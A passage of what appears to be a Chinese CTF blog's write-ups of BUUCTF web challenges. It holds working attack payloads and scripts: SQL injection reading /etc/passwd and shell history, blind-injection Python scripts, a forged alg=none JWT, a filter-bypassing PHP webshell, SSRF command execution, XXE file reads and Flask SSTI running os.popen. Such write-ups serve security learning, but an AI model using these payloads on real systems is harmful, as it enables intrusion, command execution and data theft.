mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\n分析：\n\n存在两个表 board 和 commet\n\n并且  `$sql = \"select category from board where id='$bo_id'\";`当我们评论时候还会调用board表\n\n再来看\n\n```plain\n $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n```\n\n $category,$content是我们可控的。且最后显示的是content，我们可以尝试闭合content = '$content'\n\n举例当我们去发帖语句为\n\n category 为`',content=user(),/*`其它随意，然后去详情里面评论`*/#` 这样就会回显我们当前用户信息 \n\n 然后语句会被拼接成下面这样\n\n```plain\ninsert into comment\n       set category = ' ',content=user()，/*',\n           content = '*/#',\n           bo_id = '$bo_id'\";\n```\n\n即原来的content内容被我们用注释`/**/`给注释了 我们自己可以创建一个content从而达到我们想要的语句\n\n构造payload:`',content=user(),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457876263-11247f01-8e8e-4d7d-bc18-9f12b9db735c.png)\n\n发现是root权限 这可太行了\n\n直接用load_file()函数去读文件\n\n构造payload:`123',content=((select(load_file(\"/etc/passwd\")))),/*`\n\n```\ncategory=123',content=((select(load_file(\"/etc/passwd\")))),/*` 注意一下这里category里面最好随便放点内容 如果直接是空的 比如构造成这样`',content=((select(load_file(\"/etc/passwd\")))),/*\n```\n\n闭合进去之后就会变成`category=''`直接为空字符 可能会无回显\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681458181723-73e833f2-d821-432c-9068-e596e2fdc3f6.png)\n\n发现成功读取\n\n看到最后一行 发现存在www用户 那么这是什么呢 一般我们在linux下安装web开设靶场 一般默认系统web用户会为www\n\n一般增加的用户信息会在/home路径下 root本身的信息会在根目录/root路径里\n\n比如我曾经在我的centos7上装过小皮面板 就会有个www用户默认在我的/home路径下（那个apple用户是我当时创建的用户 ）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681459107727-6f72a691-4d4d-4bfb-978b-ec74ff3871b8.png)\n\n并且能看到地址目录为：/home/www\n\n构造payload:`123',content=((select(load_file(\"/home/www/.bash_history\")))),/*`\n\n这里.bash_history文件是什么呢 一般在linux 以`.`开头的都是隐藏文件\n\n**在终端敲过的命令，linux是有记录的，默认可以记录500条历史命令。这些命令保存在用户的宿主目录中的.bash_history文件中。**\n\n拿我本地apple用户来说，如下\n\n我曾经修改过apple用户的密码 所以有记录\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475557865-59d282b4-768a-4e0d-b4d2-4723531214e1.png)\n\n回到题目得到\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475942695-14971e8c-c568-4952-af18-e563d06b2d01.png)\n\n看到记录有依次如下操作：\n\n1. `cd /tmp`\n2. `unzip html.zip`\n3. `rm -f html.zip`\n4. `cp -r html /var/www/`\n5. `cd /var/www/html/`\n6. `rm -f .DS_Store`\n7. `service apache2`\n\n他只删除了在/var/www/html下的 .DS_Store文件 原来路径下的.DS_Store文件还保存着 我们可以读取，并且里面内容读出来大多数是乱码 最好以hex()函数也就是16进制读出来\n\n .DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。  \n\n构造payload：`test',content=((select(hex(load_file(\"/tmp/html/.DS_Store\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681476511756-e8b75674-d60e-4d5d-a7ce-31cf1e5ab0bf.png)\n\n发现了flag文件名  flag_8946e1ff1ee3e40f.php\n\n然后去读取 构造payload：`test',content=((select(hex(load_file(\"/var/www/html/flag_8946e1ff1ee3e40f.php\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477444236-e9e3cfb8-9317-4232-8d52-18308f23d7fd.png)\n\n转码得到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477495066-73d43d91-f33b-43a7-b0cf-182e906dd900.png)\n","tags":["sql注入","源码泄露","sql二次注入"],"categories":["buuctf"]},{"title":"buuctf-86-[GYCTF2020]Ezsqli","url":"/post/d359692.html","content":"\n[GYCTF2020]Ezsqli\n\n<!--more-->\n\n一眼丁真，鉴定为sql盲注。\n\n## 爆库：\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^(ascii(substr((select database()),1,1))>97)\"}\ndatabase = ''\nfor i in range (1,25):\n    for j in range(32,127):\n        payload = {\"id\":\"0^(ascii(substr((select database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            database+=chr(j)\n            print(database)\n            continue\n        else:\n            pass\n# 爆库 give_grandpa_pa_pa_pa\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680942404461-ef13c20a-2bb9-45ae-8ff3-c0427fb9144b.png)\n\n库没用其实，之后可以用database()代替 而且and也是被河蟹了 give_grandpa_pa_pa_pa  库名用不了的\n\n## 爆表：\n\n因为or被河蟹\n\n所以不能用`information_schema`来查询 用`sys.x$schema_flattened_keys`来代替\n\n参考：https://nosec.org/home/detail/3830.html\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))<103\"}\ntables = ''\nfor i in range (1,50):\n    for j in range(32,127):\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            tables+=chr(j)\n            print(tables)\n            continue\n        else:\n            pass\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680945616193-69eecadc-cb2f-454e-b445-ddf0fae6ee7d.png)\n\n使用二分法改进后：\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \ntables = \"\"\nfor i in range (1,50):\n    low=32\n    high=128\n    mid = (low+high)//2\n    while low<=high:\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))>{})\".format(i,mid)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            low=mid+1\n            mid = (low+high)//2\n        else:\n            high=mid-1\n            mid = (low+high)//2\n    tables+=chr(high+1)\n    print(tables)\n    time.sleep(0.3)\n```\n\n## 爆flag\n\n这里用到了列比较去试flag\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682765495231-e76b1bfa-890e-434c-ac6e-8b375375bddf.png)\n\n`0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))` 这里的 1是猜测第一列一般为索引id 1，因此在这里用1，之后就是去慢慢写脚本去试字符，这里写脚本的时候要加上之前已经爆出的字符慢慢去比较。\n\n\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \nflag = \"\"\nfor i in range (1,50):\n    low=32\n    high=128\n    mid = (low+high)//2\n    while low<=high:\n        flag_1 = flag + chr(mid)\n        payload = {\"id\":\"0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))\".format(flag_1)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            high=mid-1\n            mid = (low+high)//2\n        else:\n            low=mid+1\n            mid = (low+high)//2\n    print(flag,chr(high))\n    flag+=chr(high)\n    time.sleep(2)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680960278657-402336f5-111f-495a-982c-872e948175e1.png)\n","tags":["sql注入","无列名注入","sql bypass","sql比较盲注"],"categories":["buuctf"]},{"title":"buuctf-85-[HFCTF2020]EasyLogin","url":"/post/a8c0011c.html","content":"\n[HFCTF2020]EasyLogin\n\n<!--more-->\n\n一道关于jwt认证的题目 之前有做过相同的题目\n\n申请一个账号登录  然后就是一个获取flag的输入框 但是我们普通身份肯定是获取不到的\n\n这里我试了试申请admin账号发现不行 做到这里估计是后面大概率是要伪造身份为admin然后getflag\n\n查看源码发现是用koa框架\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png)\n\n然后看了一下别人的wp这个框架是用jwt鉴权的\n\n关于鉴权可以看这篇文章https://juejin.cn/post/7003147063542153224\n\n登录抓包\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961802245-b79f5a21-698c-4857-8b2c-d169a365a871.png)\n\n将其放入https://jwt.io/ 自动帮我们生成相关信息\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961865878-e174b300-c12c-44a4-bd80-b9f0908ae748.png)\n\nJWT(json web token)的三个部分依次如下：（参考：http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html）\n\n- Header（头部）\n- Payload（负载）\n- Signature（签名）\n\n比如：`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY4MTk1OTg3N30.jJv8tD-ULxBStlglQIsVQgnR-nC7hbxsPJqOQiF_qJg`\n\n三部分之间用`.`间隔\n\n这里这里绕过需要将alg（算法）改为none 将secretid改为[]\n\n因为这个网站无法成none后的jwt编码 所以只能手动生成 也就是每部分base64编码 然后再用`.`连接\n\n因为算法已经是none了所以不需要第三段签名了\n\n```\n{\"alg\": \"none\",\"typ\": \"JWT\"}\neyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ==\n{\"secretid\": [],\"username\": \"admin\",\"password\": \"123\",\"iat\": 1681959877}\neyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9\n```\n\n`eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9.`注意这里虽然签名部分被省略了 但是最后一个`.`要加上 并且签名中base64编码中用来补位`==`要删除\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962341963-9db7cc75-363b-4962-a3e9-305804f318ad.png)\n\n成功以admin身份登入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962377789-ed8fda04-f829-4128-b346-0eaa7fd13958.png)\n\n获取flag即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962413236-6f1c0fae-a99c-4e2c-bb3b-b1eddb193dfd.png)\n\n其实这道题还是前期信息检索去明白他框架是jwt鉴权\n","tags":["jwt"],"categories":["buuctf"]},{"title":"buuctf-79-[红明谷CTF 2021]write_shell","url":"/post/51b0b22f.html","content":"\n[红明谷CTF 2021]write_shell\n\n<!--more-->\n\n## 碎碎念：\n\n这道题目还是蛮简单的，考了php短标签和空格绕过，还有一个双问号表达式\n\n## 解题：\n\n放出源码\n\n```plain\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction check($input){\n    if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n        // if(preg_match(\"/'| |_|=|php/\",$input)){\n        die('hacker!!!');\n    }else{\n        return $input;\n    }\n}\n\nfunction waf($input){\n  if(is_array($input)){\n      foreach($input as $key=>$output){\n          $input[$key] = waf($output);\n      }\n  }else{\n      $input = check($input);\n  }\n}\n\n$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';\nif(!file_exists($dir)){\n    mkdir($dir);\n}\nswitch($_GET[\"action\"] ?? \"\") {\n    case 'pwd':\n        echo $dir;\n        break;\n    case 'upload':\n        $data = $_GET[\"data\"] ?? \"\";\n        waf($data);\n        file_put_contents(\"$dir\" . \"index.php\", $data);\n}\n?>\n```\n\n首先就是通过你的`sandbox+md5(ip)`创建一个沙盒路径 老套路了\n\n然后这里有两个问号`??`先来看看\n\n这种是比较运算符中的NULL 合并操作符,从PHP7开始提供,作用是:从左往右第一个存在且不为 NULL 的操作数。如果都没有定义且不为 NULL，则返回 NULL  \n\n就是如果c= a??b 如果a为0 则c=b 如果a不为0 则c=a\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661478990-0980b9d2-889c-49ef-a790-becc223c2860.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661494898-f5c96b64-3163-4984-9ebb-6d5cfd802007.png)\n\n然后就是有两个模式 一个pwd就是返回路径的 upload模式让我提交shell的但是提交前会通过一个筛选\n\n过滤了`\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\"` `php eval {} ` 空格都被禁了\n\n如果直接构造`?data=ls%09/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661798378-610250da-1970-4ea0-92aa-8712ea9df795.png)\n\n则只会显示 不会执行 那么我们需要构造php代码去执行我们的linux命令 这也印证了前面为什么要禁php字样了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661956409-64ad7724-461e-4519-adb7-e66b1a2ea3e7.png)\n\n但是php字样被禁 所以要用短标签了 下面二选一\n\n```\n<?echo%09`ls%09/`?>\n<?=`ls%09/`?>\n```\n\n这里绕过空格 不能用`$IFS$9` 估计是因为php会把这个`$`当作变量来解析吧 用%09绕过就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679662047463-b38f3a26-75d5-4987-b03b-70f5bd8d9244.png)\n\n然后cat读出来就行了\n","tags":["bypass","php短标签"],"categories":["buuctf"]},{"title":"buuctf-82-[HITCON 2017]SSRFme","url":"/post/8253ed9f.html","content":"\n[HITCON 2017]SSRFme\n\n<!--more-->\n\n## 碎碎念：\n\n这是一道ssrf 也就是服务器端请求伪造的题目 发现这样的题目常常会有 $_SERVER数组的应用，还是蛮不错的qwq\n\n## 解题：\n\n进入题目给出源码：\n\n```plain\n10.244.80.206 <?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    highlight_file(__FILE__);\n```\n\n首先第一部分if作用就是获取我们的ip\n\n然后第二部分 根据我们的ip创建一个由md5加密的沙盒 然后选择它\n\n第三部分 `shell_exec` 执行我们的 get到的 `GET+url`的命令\n\n这里用到了linux中 GET命令 \n\n GET 这个命令的一个命令执行漏洞，主要是 perl 的一个特点，在 open 可以执行命令并且还支持file协议。  \n\n**注意：file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在**\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655020115-9c486f4f-405b-44fe-93c6-564e21e45ae2.png)\n\n这里以命令为文件名的文件必须加上管道符`|` 否则不行,不太明白这里为什么不加就不行\n\npathinfo — 返回文件路径的信息\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679654422668-fd2e7ba0-b67a-4c25-801b-efb66dd197e1.png)\n\n也就是创建一个我们传入filename的文件 然后选择它\n\nfile_put_contents — 将数据写入文件 \n\n这里也就是把$data的内容写入 我们的filename的文件中\n\n构造payload：`?url=file:ls /|&filename=ls /|`  这里要执行两次才能成功 也就是提交两次  为什么要提交两次呢\n\n因为前面说过 file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在 \n\n然后这里为什么要加反斜杠呢 因为管道符需要我们去转义一下\n\n因此第一次提交 是让去创建一个以命令为文件的文件  第二次才去执行并且将执行结果写入到文件中去\n\n然后再根据我们的ip 去构造沙盒路径\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655416854-884aeaf3-67e1-4957-8fec-aecb1fef681e.png)\n\n构造payload访问：`/sandbox/2eeed2f9aeae6311b507ada8fb98809e/ls \\|`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655471087-d0091932-4b56-4371-bdb7-0912c0535f48.png)\n\n看到有个readflag 理论来说直接执行`./readflag`就可以了 但是这里不行 我们要通过构造一个以命令为文件名的文件然后去访问 如果这里构造：`/readflag`文件是执行不了的 因为这里必须是`/readflag|` 才能成功执行 但是readflag| 不是readflag文件就算执行了也没用\n\n再说一句 一般见到readflag这样的文件名字 直接去执行 而不是去通过cat这样的命令去读 因为readflag里面是代码 直接`./`执行就行了\n\n构造：`?url=file:bash -c /readflag|&filename=bash -c /readflag|` 也是和上面一样执行两次然后通过路径去访问就可以拿到flag了\n\n这里用的`bash -c` 也就是将后面字符串当作命令读入执行 然后输出\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657151543-97b24931-a4a4-45ad-9f6e-2dcc37ef39d4.png) ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657191148-69954b67-5aa4-4516-a440-2b628bb97fca.png)\n\n成功！\n","tags":["ssrf","perl"],"categories":["buuctf"]},{"title":"buuctf-74-[NCTF2019]True XML cookbook.txt","url":"/post/e8a597ec.html","content":"\n[NCTF2019]True XML cookbook.txt\n\n<!--more-->\n\n## 碎碎念：\n\n这道题考察了xml和xxe，其实攻击手段手段是xxe，一开始做这道题一直没复现出来，bp爆破模块一直不动，之后用了python脚本也不行，就放弃了，第二天中午在试了一次，终于成功了，真玄学。做之前也是去补了一下xxe的知识，真不错。\n\n## 解题：\n\n进入题目是一个登录框，发现我们的登录名会显示在界面上\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643576603-ba19db5b-007b-446c-82f3-10ac758b00cc.png)\n\n之前buu有道题也是和这道题目一样的ui，直接套用上道题目的解题答案，发现肯定不行。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643711572-da9bff85-1876-406d-ad6d-69dddb2fd2f5.png)\n\n首先来看一下这个payload构成\n\n第一行`<?xml version=\"1.0\"  encoding=\"UTF-8\" ?>`这一行表示了这是xml的文档显示了版本信息和编码格式\n\n最重要的一部分：\n\n```\n<!DOCTYPE username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n```\n\n这是DTD，用来规范xml的文档格式 `username`为根元素 每个xml文档都要有一个根元素，并且有且只有一个，然后`aaa`是我们定义的一个实体，并且这里`SYSTEM`表示是外部实体，这也就是为什么xxe叫做外部实体注入，我们可以通过调用外部实体来达到我们预期的一个攻击手段。其实这里把他理解为是一个变量就可以之后是`aaa`这个实体的值，这里可以看到是一个file协议，没错xxe可以与伪协议一起搭配使用去恶意读一些文件内容。  具体可以看这里：https://xz.aliyun.com/t/3357#toc-0 总结的很到位\n\n然后通过 `&实体名称;` 的方式来调用这个我们创建的实体。\n\n然后之后就不懂了 ，慢慢的去看大佬的wp去学习\n\n之后可以通过filter伪协议去读 index.php的内容但是没有什么用\n\n然后这道题的思路是通过xxe去探测内网 参考：https://blog.spoock.com/2019/10/08/proc/\n\nhttps://www.cnblogs.com/secutity-zbk/p/14789043.html\n\n- /etc/hosts 储存域名解析的缓存\n- /etc/passwd 用户密码\n- /proc/net/arp  地址解析的内核ARP表的信息  \n- /proc/net/fib_trie 路由缓存\n\n扫一下域名解析缓存\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644669966-630764be-85ba-49fd-ae15-4972d217180d.png)\n\n扫一下用户登录状态密码啥的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644749032-70eded58-fd1c-433f-b3f9-0df596e95e13.png)\n\n发现都可以扫到\n\n去扫解析的地址和路由缓存：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644874065-fa187595-bd78-4376-9b6c-5f4bbd6bf4b9.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644939819-489e3110-fb7b-4962-8207-21c8754032c0.png)\n\n发现可疑ip，直接进行http协议读ip\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679645074091-dea2c2c1-2834-4809-a4a1-dad93bbb8423.png)\n\n发现不行，看了大佬的wp是因为c段ip不正确，也就是129这里不对，好像是计算机网络的知识，这里就不深究了，但是我们这里直接用bp的爆破模块就行，就是这里一开始没做出来，好像是题目问题，第二天终于做出来了\n\n当网段正确时，拿到flag。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643489111-d7a23ddc-2bb6-46c7-b5d0-436cb2e227ee.png)\n","tags":["xxe","内网"],"categories":["buuctf"]},{"title":"buuctf-73-[GWCTF 2019]枯燥的抽奖","url":"/post/490aa04.html","content":"\n[GWCTF 2019]枯燥的抽奖\n\n<!--more-->\n\n## 碎碎念：\n\n这道题是一道关于伪造伪随机数的题目，之前从未接触过，这次来记录一下\n\n## 解题：\n\n进入题目之后查看源码 发现`check.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483023667-c996906b-3fbe-417a-baaa-47e01e22b92f.png)\n\n发现源码：\n\n```plain\n<?php\n#这不是抽奖程序的源代码！不许看！\nheader(\"Content-Type: text/html;charset=utf-8\");\nsession_start();\nif(!isset($_SESSION['seed'])){\n$_SESSION['seed']=rand(0,999999999);\n}\n\nmt_srand($_SESSION['seed']);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\n$str_show = substr($str, 0, 10);\necho \"<p id='p1'>\".$str_show.\"</p>\";\n\n\nif(isset($_POST['num'])){\n    if($_POST['num']===$str){x\n        echo \"<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>\";\n    }\n    else{\n        echo \"<p id=flag>没抽中哦，再试试吧</p>\";\n    }\n}\nshow_source(\"check.php\");\n```\n\n总体分析一下就是我们要输入一个num参数 当num等于他产生的随机长为20的字符串 就能拿到flag\n\nmt_srand() \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483191710-fb814299-27a1-4fe9-8795-4f860a7848e9.png)\n\n简单说就是这个函数给mt_rand()函数提供一个种子 然后mt_rand()函数去生成一个随机数，但是这个随机数其实是一个伪随机数\n\n那么如果我们能破解出这个种子 这道题目就迎刃而解了\n\n这里要用到php_mt_seed脚本去破解这个种子  脚本下载地址：https://www.openwall.com/php_mt_seed/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483395438-3f102fcd-eb70-4556-b7ce-21a5d383ad02.png)\n\n然后装到我的kali上\n\n先make 一下\n\n这里make一开始不知道是什么东西然后去查了查还是有东西的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483549317-739c5e85-a900-42c3-a7d6-c296871ac8be.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483489104-33b48267-83cc-452b-90ce-84b89fb3431a.png)\n\n然后这个脚本要先把这字符串转化为一个可识别的数列\n\npython脚本如下:\n\n```plain\nstr1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nstr2='QJlBBqs6ji'\nstr3 = str1[::-1]\nlength = len(str2)\nres=''\nfor i in range(len(str2)):  \n    for j in range(len(str1)):\n        if str2[i] == str1[j]:\n            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\n            break\nprint(res)\n```\n\n但是我没有搞懂这个脚本的目的和原理\n\n进行爆破 发现种子 这里调用脚本通过`./`调用其实就是运行该脚本的意思\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483685459-9dc379c9-56ce-4f7e-a035-954752ed1f4c.png)\n\n再根据这个种子 重新生成题目中的字符串 直接用题目的代码稍加修改就行\n\n脚本如下：\n\n```plain\n<?php\nmt_srand(672026733);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n?> \n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483730008-bc495859-079b-47ec-b4cb-835e4a636a22.png)\n\n拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483777454-45feaed2-b77a-4171-be81-e44f5bae654d.png)\n","tags":["伪随机数"],"categories":["buuctf"]},{"title":"buuctf-72-[CSCCTF 2019 Qual]FlaskLight","url":"/post/8df15d0e.html","content":"\n[CSCCTF 2019 Qual]FlaskLight\n\n<!--more-->\n\n一眼丁真 flask的ssti\n\n这道题几乎没怎么过滤 payload随便在网上扒就行了\n\n但是不知道超级无敌脚本怎么会报错 只能手动去注入了\n\n记录一下各种payload的吧 这道题如果直接用`__globals__`会报错可能是被屏蔽了，通过拼接绕过就行了\n\n这些是比较简单的payload：\n\n1. `?search={{config.__init__['__global'+'s__'].os.popen(\"cmd\").read()}}`\n2. `?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval'](\"__import__('os').popen('cmd').read()\")}}`\n","tags":["python","flask框架"],"categories":["buuctf"]},{"title":"buuctf-71-[CISCN2019 华北赛区 Day1 Web2]ikun","url":"/post/8a6d07e1.html","content":"\n[CISCN2019 华北赛区 Day1 Web2]ikun\n\n<!--more-->\n\n## 碎碎念：\n\n一道关于jwt和python反序列化的题目，对我来说很新颖，暂时只会php的反序列化，就当作学习题目了，然后越做到后面的题目发现会python脚本干一些机械重复性的事情真的很有用，得找时间去学着写脚本。\n\n## 解题：\n\n进入题目\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679473847087-0169d116-8a33-4976-bd55-f371017157d8.png)\n\n看过源码一些正常操作之后什么也没发现，看到一句话，应该是让我们买lv6，在这之前先去注册登录，然后日常看一下admin的用户，发现是已经注册过的。\n\n一开始我都是一页一页的在找，发现找了10几页都没有找到，就感觉不对劲了，然后看了大佬的wp，发现要用脚本去找，最后page=181，我真的人都傻了\n\n这里放下大佬的脚本\n\n```plain\nimport requests\n\nimport time\n\nfor i in range(1,200):\n\n    time.sleep(0.8)\n\n    print(i)\n\n    url = 'http://ca5b02fb-d09b-45b9-b0ff-a14785826592.node3.buuoj.cn/shop?page={}'.format(i)\n\n    r = requests.get(url)\n\n    if 'lv6.png' in r.text:\n\n        print(\"找到lv6-----{}\".format(i))\n\n        